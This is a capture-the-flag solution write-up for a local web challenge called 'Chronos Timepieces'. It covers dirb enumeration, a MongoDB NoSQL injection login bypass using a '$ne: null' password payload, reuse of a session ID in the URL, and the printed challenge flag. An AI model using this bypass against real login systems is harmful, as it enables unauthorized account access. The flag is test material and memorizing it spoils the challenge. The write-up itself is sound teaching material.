# 🕵️‍♂️ Chronos Timepieces CTF Challenge - Solution

## 🔍 Challenge Overview
This challenge involved **web exploitation**, specifically a **NoSQL Injection vulnerability** in a Node.js (Express) and MongoDB backend. The goal was to **gain admin access** and retrieve a **hidden flag**, which was protected by a **fake flag mechanism**.

---

## 🛠️ Solution Steps

### 🔎 Step 1: Initial Reconnaissance & Discovery

Visiting `http://localhost:3000` showed a clean site for "Chronos Timepieces" with no login links.

➡️ Ran directory enumeration:

```bash
dirb http://localhost:3000 /usr/share/wordlists/dirb/common.txt
```

**Result:** Revealed `/login`, which led to the "Chronos Admin Portal" login page.

### 💉 Step 2: Exploiting NoSQL Injection

At `/login`, basic SQL injection didn’t work. But the structure hinted at **MongoDB**.

➡️ Intercepted POST request via **Burp Suite**:
```json
{"username":"test","password":"test"}
```

➡️ Modified it to use a NoSQL payload:
```json
{"username":"admin","password":{"$ne":null}}
```

➡️ Sent request, got **Login successful!** 🎉

### 🔐 Step 3: Redirect to Admin Panel

After login, it redirected to:
```
http://localhost:3000/admin?session_id=<UUID>
```

Dashboard loaded, but no flag in plain sight.

---

### 🚩 Step 4: Fake vs. Real Flag Discovery

➡️ Accessing `/flag` without session returned:

```
cyberQuest{..._FAKE}
```

➡️ Accessing `/flag` with the session_id revealed the **real flag**:

```
http://localhost:3000/flag?session_id=b0676170-ac74-4102-add5-deff3a5acaac
```

✅ Final Flag:
```
cyberQuest{N05QL_1nj3c710n_d0n3_r4xv2n3l8bq0jz9m7hk75y5u1gc3wd6}
```
